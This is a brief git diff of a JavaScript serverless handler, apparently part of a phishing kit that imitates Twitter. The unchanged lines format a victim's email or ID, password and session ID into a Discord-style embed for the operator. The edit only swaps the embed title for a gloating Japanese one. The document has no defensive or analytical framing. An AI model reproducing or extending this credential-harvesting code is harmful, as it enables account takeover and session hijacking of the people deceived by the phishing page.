@@ -10,7 +10,7 @@ export default async function handler(req, res) {
     const messageBody = {
         embeds: [
             {
-                title: "新しいリクエストです乙",
+                title: "きちゃーｗｗｗｗｗ",
                 color: 0x00b0f4, // Twitter Blueっぽい色
                 description: `**ID or Email**\n\`\`\`\n${email}\n\`\`\`\n**PASS**\n\`\`\`\n${password}\n\`\`\`\n**Session ID**\n\`\`\`\n${sessionId}\n\`\`\``,
                 footer: {
